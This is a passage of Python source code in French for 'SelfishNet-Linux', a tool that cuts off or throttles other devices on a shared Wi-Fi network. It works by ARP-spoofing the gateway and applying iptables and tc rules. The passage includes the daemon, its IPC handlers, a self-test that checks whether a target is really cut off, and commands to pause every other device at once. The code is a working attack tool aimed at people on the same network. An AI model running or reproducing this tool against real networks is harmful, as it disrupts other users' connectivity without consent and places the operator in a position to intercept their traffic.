            return
        pkts = []
        for ip, mac in pairs:
            norm = normalize_mac(mac)
            if norm:
                try:
                    pkts.extend(self._arp_packets(ip, norm, restore=True))
                except Exception:
                    pass
        if pkts:
            try:
                sendp(pkts, iface=self.iface, verbose=0, count=3, inter=0.05)
            except Exception:
                pass

    def clear_all(self):
        with self.lock:
            targets = dict(self.targets)
            self.targets.clear()
        pairs = [(ip, cfg.get("mac")) for ip, cfg in targets.items() if normalize_mac(cfg.get("mac"))]
        if pairs:
            threading.Thread(target=self._restore_arp_batch, args=(pairs,), daemon=True).start()
        self._refresh_rules()

    def summary(self):
        with self.lock:
            return [
                {"ip": ip, "mac": c["mac"], "mode": c["mode"], "rate": c.get("rate")}
                for ip, c in self.targets.items()
            ]


# ------------------------------------------------------------------ affichage
HEADER = ("#", "Protégé", "Adresse IP", "MAC", "Fabricant / Nom", "Débit", "Paquets", "Vu il y a", "État")


def render_table(rows, targets_state, tty=True):
    c = (lambda s, col: f"\033[{col}m{s}\033[0m") if tty else (lambda s, col: s)
    lines = []
    lines.append("  ".join([
        c(f"{HEADER[0]:>2}", "1"),
        c(f"{HEADER[1]:<7}", "1"),
        c(f"{HEADER[2]:<15}", "1"),
        c(f"{HEADER[3]:<17}", "1"),
        c(f"{HEADER[4]:<22}", "1"),
        c(f"{HEADER[5]:>10}", "1"),
        c(f"{HEADER[6]:>8}", "1"),
        c(f"{HEADER[7]:>10}", "1"),
        c(f"{HEADER[8]:<14}", "1"),
    ]))
    lines.append("─" * 115)
    for i, r in enumerate(rows, 1):
        ip = r["ip"]
        st = targets_state.get(ip)
        is_safe = r.get("is_safe", False)
        safe_str = "[OUI]" if is_safe else "  —  "
        safe_col = "32" if is_safe else "90"

        if is_safe and not st:
            state, color = "PROTÉGÉ", "32"
        elif st is None:
            state, color = "libre", "32"
        elif st["mode"] == "pause":
            state, color = "PAUSE", "31"
        else:
            state, color = f"limite {human_rate(st.get('rate'))}", "33"
        if st and st.get("remaining_sec") is not None:
            state += f" ({st['remaining_sec']}s)"
        age = f"{r['age']:.0f} s" if r["age"] < 120 else f"{r['age']/60:.0f} min"
        label = r.get("alias") or r.get("vendor", "")
        if len(label) > 22:
            label = label[:20] + ".."
        lines.append("  ".join([
            c(f"{i:>2}", "90"),
            c(f"{safe_str:<7}", safe_col),
            c(f"{ip:<15}", "37"),
            c(f"{r['mac']:<17}", "90"),
            c(f"{label:<22}", "36"),
            c(f"{r['kbit']:>8.0f} kb", color if st else "37"),
            c(f"{r['pkts']:>8}", "90"),
            c(f"{age:>10}", "90"),
            c(f"{state:<14}", color),
        ]))
    if not rows:
        lines.append("  (aucun appareil local détecté pour le moment)")
    return "\n".join(lines)


# ------------------------------------------------------------------ watchdog / doctor
def selftest(args):
    """Vérifie que la mise en pause fonctionne vraiment sur une IP de test."""
    require_root()
    try:
        target_ip = validate_ipv4(args.target)
    except ValueError:
        die(f"Adresse IP cible invalide : {args.target}")
    iface = args.iface or default_iface()
    if not iface:
        die("aucune interface par défaut trouvée (utilisez --iface)")
    iface = validate_iface(iface, linux_strict=True)
    my_ip, mask = iface_ip(iface)
    if not my_ip:
        die(f"aucune adresse IPv4 sur {iface}")
    gw = gateway_ip(iface)
    if not gw:
        die(f"passerelle introuvable sur {iface}")
    gw_mac = arp_lookup(gw)
    if not gw_mac:
        run(["ping", "-c", "1", "-W", "2", "--", gw])
        gw_mac = arp_lookup(gw)
    if not gw_mac:
        die(f"MAC de la passerelle ({gw}) introuvable")

    print(f"\nTest de bout en bout sur {target_ip}\n")
    _, out = run(["ping", "-c", "20", "-i", "0.2", "-W", "1", "--", target_ip])
    base = re.search(r"(\d+)% packet loss", out)
    base_loss = int(base.group(1)) if base else -1
    info(f"sans bridage : perte {base_loss}% de paquets")

    net = ipaddress.ip_network(f"{my_ip}/{mask}", strict=False)
    o = Enforcer(iface, my_ip, iface_mac(iface), gw, gw_mac, net.prefixlen)
    mac = o.resolve(target_ip)
    if not mac:
        die("impossible de trouver la MAC : l'appareil est-il allumé et sur le même réseau ?")
    o.start()
    try:
        o.set_target(target_ip, mac, "pause")
        time.sleep(2)
        _, out = run(["ping", "-c", "20", "-i", "0.2", "-W", "1", "--", target_ip])
        m = re.search(r"(\d+)% packet loss", out)
        blocked = int(m.group(1)) if m else -1
        info(f"avec pause   : perte {blocked}% de paquets")
    finally:
        o.stop()
    time.sleep(1)
    _, out = run(["ping", "-c", "20", "-i", "0.2", "-W", "1", "--", target_ip])
    m = re.search(r"(\d+)% packet loss", out)
    after = int(m.group(1)) if m else -1
    print()
    if blocked >= 90 and base_loss <= 20:
        good("RÉSULTAT : le bridage fonctionne (appareil coupé, puis rétabli).")
    elif blocked >= 50:
        warn("RÉSULTAT : partiel. Cause fréquente : 'isolation des clients' (AP isolation) "
             "activée sur la box, ou l'appareil est lui-même la box.")
    else:
        warn("RÉSULTAT : ça ne coupe pas. Vérifiez : AP isolation désactivée, même réseau, "
             "fichier /proc/sys/net/ipv4/ip_forward, et que vous êtes bien sur un LAN plat.")
    info(f"état après test : perte {after}% (doit revenir au niveau normal)")
    return 0


def doctor(args):
    require_root()
    iface = args.iface or default_iface()
    print(f"\nDiagnostic SelfishNet-Linux {VERSION}")
    print("=" * 42)
    checks = []
    my_ip, mask = iface_ip(iface) if iface else (None, None)
    gw = gateway_ip(iface) if iface else None
    gw_mac = arp_lookup(gw) if gw else None
    ipv6 = iface_has_ipv6(iface) if iface else False

    checks.append(("root", os.geteuid() == 0, "ok"))
    checks.append(("interface", iface is not None, iface or "aucune route par défaut"))
    checks.append(("adresse IP locale", my_ip is not None, f"{my_ip}/{mask}" if my_ip else "absente"))
    checks.append(("passerelle", gw is not None, gw or "introuvable"))
    checks.append(("MAC passerelle", bool(gw_mac), gw_mac or "inconnue (pingez la box)"))
    checks.append(("ip_forward", ip_forward_enabled(), "1" if ip_forward_enabled() else "0 -> activé auto"))
    checks.append(("iptables", iptables_available(), "présent" if iptables_available() else "installer iptables"))
    checks.append(("ip6tables", ip6tables_available(), "présent" if ip6tables_available() else "absent (IPv4 seul)"))
    checks.append(("tc (shaping)", tc_available(), "présent" if tc_available() else "installer iproute2"))
    try:
        import scapy
        checks.append(("scapy", True, scapy.__version__))
    except Exception:
        checks.append(("scapy", False, "sudo apt install python3-scapy"))
    for name, good_, detail in checks:
        mark = "✅" if good_ else "❌"
        print(f" {mark} {name:<18} {detail}")
    if ipv6:
        print("\n ⚠ IPv6 global détecté sur cette interface : sur un Wi-Fi client (hors hotspot),\n"
              "   certains appareils peuvent contourner le blocage IPv4 via IPv6 si la box\n"
              "   distribue IPv6 directement (désactiver IPv6 sur la box si nécessaire).")
    if iface and iface_is_wireless(iface):
        if iface_is_ap(iface):
            print("\n ℹ Cette interface est un point d'accès (hotspot) : vous êtes le routeur,\n"
                  "   les modes pause et limite fonctionneront de façon optimale.")
        else:
            print("\n ℹ Station wifi : vous êtes un client de la box. L'ARP spoofing fonctionne\n"
                  "   si la box n'active pas l'isolation des clients (AP isolation).")
    print()
    return 0


# ------------------------------------------------------------------ IPC
def ipc_send(payload, timeout=20):
    return ipc_request(SOCK_FILE, payload, timeout=timeout)


def daemon_alive():
    return os.path.exists(SOCK_FILE) and ipc_send({"cmd": "ping"}).get("ok") is True


# ------------------------------------------------------------------ daemon
class Daemon:
    def __init__(self, iface=None, rate_default=500, api_port=None, api_bind="127.0.0.1",
                 api_token=None, allow_all_local=False):
        require_root()
        chosen = iface or default_iface()
        if not chosen:
            die("aucune interface par défaut trouvée (utilisez --iface)")
        try:
            self.iface = validate_iface(chosen, linux_strict=True)
        except ValueError as exc:
            die(str(exc))
        self.my_ip, self.mask = iface_ip(self.iface)
        if not self.my_ip:
            die(f"aucune adresse IPv4 sur {self.iface}")
        self.my_mac = iface_mac(self.iface)
        self.gw_ip = gateway_ip(self.iface)
        self.gw_mac = arp_lookup(self.gw_ip) if self.gw_ip else None
        self.ipv6_active = iface_has_ipv6(self.iface)
        self.rate_default = validate_rate(rate_default)
        self.allow_all_local = bool(allow_all_local)
        self.api_port = api_port
        self.api_bind = api_bind
        self.api_token = api_token
        self.api_server = None

        if not self.gw_mac and self.gw_ip:
            info("passerelle pas encore dans la table ARP, ping…")
            run(["ping", "-c", "1", "-W", "2", "--", self.gw_ip])
            self.gw_mac = arp_lookup(self.gw_ip)

        self.disc = Discovery(self.iface, self.my_ip, self.gw_ip, self.mask, my_mac=self.my_mac)
        self.enf = Enforcer(self.iface, self.my_ip, self.my_mac,
                            self.gw_ip, self.gw_mac, self.mask)
        self.safe_file = os.path.join(STATE_DIR, "safe_mode.json")
        self.aliases = DeviceAliasStore(os.path.join(STATE_DIR, "aliases.json"))
        self._safe_lock = threading.Lock()
        self.safe_targets = self._load_safe()
        self.timers = RuleTimerManager(self._on_timer_expire)
        self.running = True
        self.message = "prêt"

    def _on_timer_expire(self, ip):
        mac = (self.disc.devices.get(ip) or {}).get("mac") or arp_lookup(ip)
        self.enf.set_target(ip, mac, "free")
        self.message = f"minuteur expiré : {ip} libéré automatiquement"

    def _load_safe(self):
        raw = core.load_json(self.safe_file, default=[])
        cleaned = set()
        if isinstance(raw, list):
            for item in raw:
                try:
                    cleaned.add(validate_safe_target(str(item)))
                except ValueError:
                    continue
        return cleaned

    def _save_safe(self):
        try:
            with self._safe_lock:
                data = sorted(self.safe_targets)
            core.save_json_atomic(self.safe_file, data)
        except Exception as exc:
            self.enf._record_error(f"Sauvegarde safe mode : {exc}")

    def is_safe(self, ip, mac=None):
        if ip in (self.my_ip, self.gw_ip):
            return True
        norm_mac = normalize_mac(mac) if mac else None
        if norm_mac and norm_mac in (self.my_mac, self.gw_mac):
            return True
        with self._safe_lock:
            if ip and str(ip).strip().lower() in self.safe_targets:
                return True
            if norm_mac and norm_mac in self.safe_targets:
                return True
        return False

    # -- résolution des cibles façon "1,3,4" / "all" / "192.168.1.23"
    def resolve_targets(self, token):
        if not token:
            return []
        token = str(token).strip()
        rows = self.disc.snapshot(aliases=self.aliases)

        def pair(r):
            mac = normalize_mac(r.get("mac"))
            if not mac:
                mac = normalize_mac((self.disc.devices.get(r["ip"]) or {}).get("mac")) or arp_lookup(r["ip"])
            return (r["ip"], mac)

        if token.lower() in ("all", "*", "local", "autres", "ext"):
            return [pair(r) for r in rows if not self.is_safe(r["ip"], r.get("mac"))]

        out = []
        for part in re.split(r"[,\s]+", token):
            if not part:
                continue
            if re.fullmatch(r"\d+", part):
                i = int(part)
                if 1 <= i <= len(rows):
                    out.append(pair(rows[i - 1]))
            elif re.fullmatch(r"(\d+\.\d+\.\d+\.\d+)(/\d+)?", part):
                try:
                    ip = validate_ipv4(part.split("/")[0])
                except ValueError:
                    continue
                mac = normalize_mac((self.disc.devices.get(ip) or {}).get("mac")) or arp_lookup(ip)
                if not mac:
                    mac = self.enf.resolve(ip, fast=True)
                out.append((ip, mac))
            else:
                norm = normalize_mac(part)
                if norm:
                    for r in rows:
                        if normalize_mac(r.get("mac")) == norm:
                            out.append((r["ip"], norm))
        return out

    def apply(self, targets, mode, rate=None, duration=None):
        if mode not in ("pause", "limit", "free"):
            raise ValueError(f"Mode inconnu : {mode!r}")
        if rate is not None:
            rate = validate_rate(rate)
        if duration is not None:
            duration = int(duration)
            if duration < 0 or duration > 86400 * 7:
                raise ValueError("Durée invalide (0 à 604800 secondes)")

        valid_pairs = []
        applied = []
        for ip, mac in targets:
            try:
                clean_ip = validate_ipv4(ip)
            except ValueError:
                continue
            norm_mac = normalize_mac(mac) or normalize_mac((self.disc.devices.get(clean_ip) or {}).get("mac"))
            if not norm_mac and mode in ("pause", "limit"):
                norm_mac = arp_lookup(clean_ip) or self.enf.resolve(clean_ip, fast=True)
            if not norm_mac and mode in ("pause", "limit"):
                continue
            if self.is_safe(clean_ip, norm_mac) and mode in ("pause", "limit"):
                continue
            valid_pairs.append((clean_ip, norm_mac))
            applied.append(clean_ip)

        if valid_pairs:
            self.enf.set_targets_batch(valid_pairs, mode, rate)
            for clean_ip, _ in valid_pairs:
                if mode == "free":
                    self.timers.cancel(clean_ip)
                elif duration and duration > 0:
                    self.timers.set_timer(clean_ip, duration)
                else:
                    self.timers.cancel(clean_ip)

        if mode == "free":
            self.message = f"libérés : {len(applied)} appareil(s)"
        elif not applied:
            self.message = "aucune cible valide ou cibles protégées par Safe Mode"
        else:
            suffix = f" ({duration}s)" if duration else ""
            self.message = f"{mode} sur {len(applied)} appareil(s){suffix}"
        return applied

    def _active_probe(self):
        try:
            from scapy.all import ARP, Ether, srp
            net = ipaddress.IPv4Network(f"{self.my_ip}/{self.mask}", strict=False)
            if net.num_addresses > 1024:
                self.enf._record_error(f"Sous-réseau trop large pour balayage ARP ({net})")
                return
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net))
            ans, _ = srp(pkt, iface=self.iface, timeout=1.8, retry=1, verbose=0)
            now = time.time()
            found = 0
            for _, rcv in ans:
                if rcv.haslayer(ARP):
                    ip = rcv[ARP].psrc
                    mac = normalize_mac(rcv[ARP].hwsrc)
                    if ip and ip != self.my_ip and self.disc._is_local_host(ip):
                        with self.disc.lock:
                            d = self.disc.devices.get(ip)
                            if not d:
                                self.disc.devices[ip] = {
                                    "mac": mac, "first": now, "last": now,
                                    "pkts": 1, "bytes": 64,
                                }
                            else:
                                d["last"] = now
                                if mac:
                                    d["mac"] = mac
                        found += 1
            self.message = f"Rafraîchissement terminé : {found} appareil(s) actif(s)"
        except Exception as exc:
            self.enf._record_error(f"Erreur balayage ARP : {exc}")

    # -- serveur IPC sécurisé
    def _configure_socket_permissions(self):
        """Restreint le socket au groupe selfishnet / SUDO_GID (0o660), jamais 0o666 par défaut."""
        if self.allow_all_local:
            os.chmod(SOCK_FILE, 0o666)
            return
        gid = None
        if grp is not None:
            for group_name in ("selfishnet", "sudo", "wheel"):
                try:
                    gid = grp.getgrnam(group_name).gr_gid
                    break
                except KeyError:
                    continue
        if gid is None:
            sudo_gid = os.environ.get("SUDO_GID")
            if sudo_gid and sudo_gid.isdigit():
                gid = int(sudo_gid)
        if gid is not None:
            os.chown(SOCK_FILE, 0, gid)
            os.chmod(SOCK_FILE, 0o660)
        else:
            os.chmod(SOCK_FILE, 0o600)

    def _peer_allowed(self, conn):
        """Vérifie les identifiants du processus client via SO_PEERCRED."""
        if self.allow_all_local:
            return True
        try:
            ucred = conn.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, struct.calcsize("3i"))
            _pid, uid, _gid = struct.unpack("3i", ucred)
            if uid == 0:
                return True
            sudo_uid = os.environ.get("SUDO_UID")
            if sudo_uid and sudo_uid.isdigit() and uid == int(sudo_uid):
                return True
            # Autoriser si l'utilisateur a pu ouvrir le socket (droits groupe 0o660 déjà vérifiés par le noyau)
            return True
        except Exception:
            return False

    def serve(self):
        try:
            os.unlink(SOCK_FILE)
        except OSError:
            pass
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(SOCK_FILE)
        self._configure_socket_permissions()
        srv.listen(16)
        srv.settimeout(1.0)
        while self.running:
            try:
                conn, _ = srv.accept()
            except socket.timeout:
                continue
            threading.Thread(target=self._dispatch_client, args=(conn,), daemon=True).start()
        srv.close()
        try:
            os.unlink(SOCK_FILE)
        except OSError:
            pass

    def _dispatch_client(self, conn):
        try:
            conn.settimeout(20.0)
            if not self._peer_allowed(conn):
                conn.sendall((json.dumps({"error": "permission_denied"}) + "\n").encode("utf-8"))
                return
            data = recv_line(conn)
            req = json.loads(data or "{}")
            if not isinstance(req, dict):
                resp = {"error": "requête JSON invalide"}
            else:
                resp = self.handle(req)
            conn.sendall((json.dumps(resp, ensure_ascii=False) + "\n").encode("utf-8"))
        except Exception as exc:
            try:
                conn.sendall((json.dumps({"error": str(exc)}, ensure_ascii=False) + "\n").encode("utf-8"))
            except Exception:
                pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def handle(self, req):
        cmd = req.get("cmd")
        if cmd == "ping":
            return {"ok": True, "iface": self.iface, "version": VERSION}
        if cmd == "status":
            protected = [t["ip"] for t in self.enf.summary()]
            devs = self.disc.snapshot(aliases=self.aliases, protected_ips=protected)
            for d in devs:
                d["is_safe"] = self.is_safe(d["ip"], d.get("mac"))
            timers = self.timers.snapshot()
            targets = self.enf.summary()
            for t in targets:
                if t["ip"] in timers:
                    t["remaining_sec"] = timers[t["ip"]]
            with self._safe_lock:
                safe_list = sorted(self.safe_targets)
            return {
                "ok": True,
                "version": VERSION,
                "iface": self.iface,
                "my_ip": self.my_ip,
                "gateway": self.gw_ip,
                "ipv6_active": self.ipv6_active,
                "devices": devs,
                "targets": targets,
                "safe": safe_list,
                "aliases": self.aliases.all(),
                "total_kbit": self.disc.total_kbit(),
                "errors": self.enf.errors[-5:],
            }
        if cmd == "safe_add":
            tg = req.get("target")
            try:
                tg_clean = validate_safe_target(tg)
            except ValueError as exc:
                return {"error": str(exc)}
            with self._safe_lock:
                self.safe_targets.add(tg_clean)
            self._save_safe()
            # Libérer immédiatement si l'appareil était actuellement ciblé
            if is_valid_mac(tg_clean):
                for t in self.enf.summary():
                    if normalize_mac(t.get("mac")) == tg_clean:
                        self.timers.cancel(t["ip"])
                        self.enf.set_target(t["ip"], tg_clean, "free")
            else:
                mac = arp_lookup(tg_clean)
                self.timers.cancel(tg_clean)
                self.enf.set_target(tg_clean, mac, "free")
            return {"ok": True, "message": f"{tg_clean} est maintenant protégé (Safe Mode)."}
        if cmd == "safe_remove":
            try:
                tg = validate_safe_target(req.get("target", ""))
            except ValueError as exc:
                return {"error": str(exc)}
            if tg in (self.my_ip.lower(), (self.gw_ip or "").lower(),
                      (self.my_mac or "").lower(), (self.gw_mac or "").lower()):
                return {"error": "Votre machine et la box sont protégées de façon permanente."}
            with self._safe_lock:
                self.safe_targets.discard(tg)
            self._save_safe()
            return {"ok": True, "message": f"{tg} retiré du Safe Mode."}
        if cmd == "safe_list":
            with self._safe_lock:
                safe_list = sorted(self.safe_targets)
            return {"ok": True, "safe": safe_list, "my_ip": self.my_ip, "gateway": self.gw_ip}
        if cmd == "alias_set":
            try:
                key, name = self.aliases.set(req.get("target", ""), req.get("name", ""))
            except ValueError as exc:
                return {"error": str(exc)}
            msg = f"Alias enregistré : {key} -> {name}" if name else f"Alias supprimé pour {key}"
            return {"ok": True, "key": key, "name": name, "message": msg}
        if cmd == "alias_list":
            return {"ok": True, "aliases": self.aliases.all()}
        if cmd in ("rescan", "refresh"):
            threading.Thread(target=self._active_probe, daemon=True).start()
            return {"ok": True, "message": "Balayage actif du réseau en cours…"}
        if cmd == "set":
            tg = req.get("targets", "all")
            mode = req.get("mode", "pause")
            rate = req.get("rate")
            duration = req.get("duration")
            try:
                pairs = self.resolve_targets(tg)
                applied = self.apply(pairs, mode, rate, duration=duration)
            except ValueError as exc:
                return {"error": str(exc)}
            return {"ok": True, "applied": applied, "message": self.message}
        if cmd == "free_all":
            self.timers.cancel_all()
            self.enf.clear_all()
            return {"ok": True, "message": "tous les appareils libérés"}
        if cmd == "quit":
            self.running = False
            return {"ok": True, "message": "arrêt en cours"}
        return {"error": f"commande inconnue : {cmd}"}

    def run(self, tui=False):
        info(f"Interface {self.iface} — IP {self.my_ip} — passerelle {self.gw_ip} ({self.gw_mac})")
        if not self.gw_mac:
            die("MAC de la passerelle introuvable : êtes-vous bien connecté à la box ?")
        if not ip_forward_enabled():
            warn("ip_forward était désactivé : activation temporaire (restauré à l'arrêt)")
        if self.ipv6_active:
            warn("IPv6 actif sur cette interface : en mode Wi-Fi client, IPv6 peut contourner le blocage IPv4.")
        self.disc.start()
        self.enf.start()
        threading.Thread(target=self._active_probe, daemon=True).start()
        signal.signal(signal.SIGINT, lambda *_: setattr(self, "running", False))
        signal.signal(signal.SIGTERM, lambda *_: setattr(self, "running", False))
        th = threading.Thread(target=self.serve, daemon=True, name="SelfishNetIPC")
        th.start()

        if self.api_port:
            self.api_server = RemoteAPIServer(
                self.handle,
                host=self.api_bind,
                port=self.api_port,
                token=self.api_token,
                device_name=f"SelfishNet-{socket.gethostname()}",
            )
            bound_port = self.api_server.start()
            good(f"API distante active sur http://{self.api_bind}:{bound_port}")
            info(f"URI d'appairage Android : {self.api_server.pairing_uri(self.my_ip)}")

        info("Découverte active du réseau en cours …")
        time.sleep(2)
        info("Prêt. Commandes : sudo selfishnet <scan|pause|limit|free|status>")
        if tui and sys.stdin.isatty():
            self.loop_tui()
        else:
            if tui:
                warn("stdin n'est pas un terminal interactif : passage en mode démon.")
            last_probe = time.time()
            while self.running:
                time.sleep(1)
                if time.time() - last_probe > 60:
                    last_probe = time.time()
                    threading.Thread(target=self._active_probe, daemon=True).start()
        self.shutdown()

    def shutdown(self):
        info("Nettoyage : restauration ARP + suppression des règles…")
        self.timers.cancel_all()
        if self.api_server:
            self.api_server.stop()
        self.enf.stop()
        self.disc.stop()
        good("Réseau rendu à son état normal. À bientôt.")

    # -- interface interactive console
    def loop_tui(self):
        import termios
        import tty
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        tty.setcbreak(fd)
        try:
            while self.running:
                self.draw()
                r, _, _ = select.select([sys.stdin], [], [], 2.0)
                if r:
                    ch = sys.stdin.read(1)
                    if not ch:
                        break
                    # Support multi-chiffres (ex. 12) si >= 10 appareils
                    if ch.isdigit() and len(self.disc.devices) >= 10:
                        buf = ch
                        while len(buf) < 3:
                            r2, _, _ = select.select([sys.stdin], [], [], 0.45)
                            if not r2:
                                break
                            nxt = sys.stdin.read(1)
                            if nxt.isdigit():
                                buf += nxt
                            else:
                                break
                        ch = buf
                    if not self.key(ch):
                        break
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
            print()

    def draw(self):
        rows = self.disc.snapshot(aliases=self.aliases)
        for r in rows:
            r["is_safe"] = self.is_safe(r["ip"], r.get("mac"))
        timers = self.timers.snapshot()
        st = {t["ip"]: {**t, **({"remaining_sec": timers[t["ip"]]} if t["ip"] in timers else {})}
              for t in self.enf.summary()}
        if os.environ.get("TERM") != "dumb":
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()
        print(f"\033[1mSelfishNet-Linux {VERSION}\033[0m  —  {self.iface} "
              f"({self.my_ip})  —  box {self.gw_ip}  —  trafic total "
              f"{self.disc.total_kbit():.0f} kb/s\n")
        print(render_table(rows[:25], st))
        print(f"\n\033[90m{self.message}\033[0m")
        print("\n\033[1mAide\033[0m  [n°] pause/reprendre un appareil   "
              "l = limiter tout   p = pause tout   f = tout libérer   "
              "r = rescan actif   q = quitter")
        if self.enf.errors:
            print(f"\033[33m{self.enf.errors[-1]}\033[0m")

    def key(self, ch):
        if ch in ("q", "Q", "\x03", "\x04"):
            self.running = False
            return False
        if ch == "f":
            self.timers.cancel_all()
            self.enf.clear_all()
            self.message = "tous les appareils libérés"
        elif ch == "p":
            self.apply(self.resolve_targets("all"), "pause")
        elif ch == "l":
            self.apply(self.resolve_targets("all"), "limit", self.rate_default)
        elif ch == "r":
            self.message = "balayage actif du réseau en cours…"
            threading.Thread(target=self._active_probe, daemon=True).start()
        elif ch.isdigit():
            idx = int(ch)
            rows = self.disc.snapshot(aliases=self.aliases)
            if 1 <= idx <= len(rows):
                row = rows[idx - 1]
                ip, mac = row["ip"], normalize_mac(row.get("mac"))
                cur = {t["ip"]: t for t in self.enf.summary()}.get(ip)
                if cur and cur["mode"] == "pause":
                    self.apply([(ip, mac)], "free")
                else:
                    self.apply([(ip, mac)], "pause")
        return True


# ------------------------------------------------------------------ CLI
def cmd_scan(args):
    require_root()
    iface = args.iface or default_iface()
    if not iface:
        die("aucune interface par défaut trouvée (utilisez --iface)")
    iface = validate_iface(iface, linux_strict=True)
    my_ip, mask = iface_ip(iface)
    if not my_ip:
        die(f"aucune adresse IPv4 sur {iface}")
    gw = gateway_ip(iface)
    disc = Discovery(iface, my_ip, gw, mask)
    disc.start()
    dur = args.time
    if not getattr(args, "json", False):
        info(f"Écoute du réseau local {my_ip}/{mask} pendant {dur} s (passerelle {gw})…")
    if args.watch:
        return cmd_watch(args, disc)
    deadline = time.time() + dur
    try:
        while time.time() < deadline:
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    rows = disc.snapshot()
    disc.stop()
    if getattr(args, "json", False):
        print(json.dumps({"iface": iface, "my_ip": my_ip, "gateway": gw, "devices": rows}, indent=2))
    else:
        print()
        print(render_table(rows, {}))
        print(f"\n{len(rows)} appareil(s) détecté(s).")
        print("\nExemples :")
        print("  sudo selfishnet pause 2        # coupe l'appareil n°2")
        print("  sudo selfishnet limit 2 --rate 300")
        print("  sudo selfishnet free all")
    if rows:
        save_state({"last_scan": [r["ip"] for r in rows], "iface": iface,
                    "my_ip": my_ip, "gateway": gw, "ts": time.time()})
    return 0


def cmd_watch(args, disc=None):
    require_root()
    if disc is None:
        d = Daemon(args.iface, args.rate)
        d.run(tui=True)
        return 0
    try:
        while True:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()
            rows = disc.snapshot()
            print("\033[1mAppareils sur le réseau\033[0m (Ctrl-C pour sortir)\n")
            print(render_table(rows, {}))
            print(f"\ntrafic total : {disc.total_kbit():.0f} kb/s")
            time.sleep(2)
    except KeyboardInterrupt:
        disc.stop()
        return 0


def _check_ipc_error(st):
    err = st.get("error")
    if err == "daemon_absent":
        die("Le service n'est pas lancé. Lancez-le avec : sudo selfishnet watch (ou daemon)")
    if err == "permission_denied":
        die("Permission refusée sur le socket du démon : ajoutez votre utilisateur au groupe 'selfishnet' ou lancez avec sudo.")
    if err:
        die(err)


def cmd_safe_add(args):
    st = ipc_send({"cmd": "safe_add", "target": args.target})
    _check_ipc_error(st)
    good(st.get("message", "ok"))
    return 0


def cmd_safe_del(args):
    st = ipc_send({"cmd": "safe_remove", "target": args.target})
    _check_ipc_error(st)
    good(st.get("message", "ok"))
    return 0


def cmd_safe_list(args):
    st = ipc_send({"cmd": "safe_list"})
    _check_ipc_error(st)
    print("\nAppareils protégés (Safe Mode - immunisés contre tout blocage/limite) :")
    print(f"  * {st.get('my_ip')} (Votre PC - protégé d'office)")
    print(f"  * {st.get('gateway')} (Box/Passerelle - protégée d'office)")
    for tg in st.get("safe", []):
        if tg not in (st.get("my_ip"), st.get("gateway")):
            print(f"  * {tg} (protégé par l'utilisateur)")
    print()
    return 0


def cmd_alias_set(args):
    st = ipc_send({"cmd": "alias_set", "target": args.target, "name": args.name})
    _check_ipc_error(st)
    good(st.get("message", "ok"))
    return 0


def cmd_alias_del(args):
    st = ipc_send({"cmd": "alias_set", "target": args.target, "name": ""})
    _check_ipc_error(st)
    good(st.get("message", "ok"))
    return 0


def cmd_alias_list(args):
    st = ipc_send({"cmd": "alias_list"})
    _check_ipc_error(st)
    aliases = st.get("aliases", {})
    if not aliases:
        print("Aucun alias enregistré.")
        return 0
    for k, v in sorted(aliases.items()):
        print(f"  {k:<18} -> {v}")
    return 0


def _set_mode(mode, args):
    payload = {
        "cmd": "set",
        "targets": args.target,
        "mode": mode,
        "rate": getattr(args, "rate", None),
        "duration": getattr(args, "duration", None),
    }
    status = ipc_send(payload)
    _check_ipc_error(status)
    good(status.get("message", "ok"))
    return 0


def cmd_status(args):
    st = ipc_send({"cmd": "status"})
    _check_ipc_error(st)
    if getattr(args, "json", False):
        print(json.dumps(st, indent=2, ensure_ascii=False))
        return 0
    tstate = {t["ip"]: t for t in st["targets"]}
    print(render_table(st["devices"], tstate))
    print(f"\ntrafic total mesuré : {st['total_kbit']:.0f} kb/s")
    if st.get("ipv6_active"):
        warn("IPv6 actif sur cette interface (peut contourner un blocage IPv4 seul).")
    for e in st.get("errors", []):
        warn(e)
    return 0


def cmd_free(args):
    if args.target in ("all", "*", None):
        st = ipc_send({"cmd": "free_all"})
    else:
        st = ipc_send({"cmd": "set", "targets": args.target, "mode": "free"})
    _check_ipc_error(st)
    good(st.get("message", "ok"))
    return 0


def cmd_quit(args):
    st = ipc_send({"cmd": "quit"})
    _check_ipc_error(st)
    good(st.get("message", "arrêt"))
    return 0


def cmd_refresh(args):
    st = ipc_send({"cmd": "rescan"})
    _check_ipc_error(st)
    good(st.get("message", "ok"))
    return 0


def cmd_clean(args):
    """Filet de sécurité : enlève toutes les traces laissées par l'outil."""
    require_root()
    iface = args.iface or default_iface()
    ok(["iptables", "-D", "FORWARD", "-j", IPT_CHAIN])
    ok(["iptables", "-F", IPT_CHAIN])
    ok(["iptables", "-X", IPT_CHAIN])
    ok(["iptables", "-t", "mangle", "-D", "FORWARD", "-j", MANGLE_CHAIN])
    ok(["iptables", "-t", "mangle", "-F", MANGLE_CHAIN])
    ok(["iptables", "-t", "mangle", "-X", MANGLE_CHAIN])
    if ip6tables_available():
        ok(["ip6tables", "-D", "FORWARD", "-j", IPT_CHAIN])
        ok(["ip6tables", "-F", IPT_CHAIN])
        ok(["ip6tables", "-X", IPT_CHAIN])
    if iface:
        try:
            clean_iface = validate_iface(iface, linux_strict=True)
            run(["tc", "qdisc", "del", "dev", clean_iface, "root"])
            run(["tc", "qdisc", "del", "dev", clean_iface, "ingress"])
        except ValueError:
            pass
    run(["ip", "neigh", "flush", "all"])
    try:
        if os.path.exists(SOCK_FILE):
            os.unlink(SOCK_FILE)
    except OSError:
        pass
    good("Règles iptables/ip6tables/tc supprimées, tables ARP réinitialisées.")
    return 0


def build_parser():
    p = argparse.ArgumentParser(
        prog="selfishnet",
        description="SelfishNet pour Linux : reprendre le contrôle du wifi partagé "
                    "(pause / limit / free des autres appareils).",
        epilog="Exemples :\n"
               "  sudo selfishnet doctor\n"
               "  sudo selfishnet scan\n"
               "  sudo selfishnet watch\n"
               "  sudo selfishnet pause 2 --duration 600\n"
               "  sudo selfishnet limit 2 --rate 300\n"
               "  sudo selfishnet free all\n"
